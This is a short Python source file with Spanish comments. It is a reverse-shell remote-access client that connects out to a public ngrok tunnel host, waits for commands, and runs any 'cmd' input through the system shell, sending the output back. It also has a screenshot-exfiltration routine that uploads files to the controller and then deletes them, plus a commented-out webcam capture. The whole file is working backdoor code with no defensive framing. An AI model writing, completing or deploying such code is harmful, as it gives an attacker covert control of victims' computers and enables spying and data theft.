from socket import socket,AF_INET,SOCK_STREAM,gethostbyname
#from pyautogui import screenshot
from os import path,remove
#from cv2 import VideoCapture,CAP_DSHOW,imwrite
from subprocess import Popen,PIPE

def enviar_archivo(nombre):
    archivo = open(nombre,'rb')
    size = path.getsize(nombre)#tamaño del archivo en bytes
    conexion.sendall((str(size)+'-').encode())
    while True:
        data = archivo.read(1024)
        if data:
            conexion.sendall(data)
        else:
            break
    archivo.close()
    remove(nombre)
#gethostbyname('4.tcp.ngrok.io')
HOST = gethostbyname('4.tcp.ngrok.io')
PORT = 18201
conexion = socket(AF_INET,SOCK_STREAM)
conexion.connect((HOST,PORT))

while True:

    comando = conexion.recv(40960)
    comando = comando.decode()

    if comando == 'exit':
        break
    elif comando == 'screenshot':
        screenshot('foto.png')
        enviar_archivo('foto.png')

    elif comando == 'camera':
        #tomamos la foto
        pass
        """ camera = VideoCapture(0,CAP_DSHOW)
        ret, frame = camera.read()
        imwrite('camara.png',frame)
        camera.release()
        #tomamos la foto
        enviar_archivo('camara.png') """

    elif comando.startswith('cmd '):
        comando = comando.replace(" ","")
        comando = comando[3:]
        proceso = Popen(comando,shell=True,stdout=PIPE,stdin=PIPE,stderr=PIPE)
        salida,error = proceso.communicate()
        salida_final = salida+error
        size = str(len(salida_final)).encode()
        output = size+b'-'+salida_final
        conexion.sendall(output)


conexion.close()
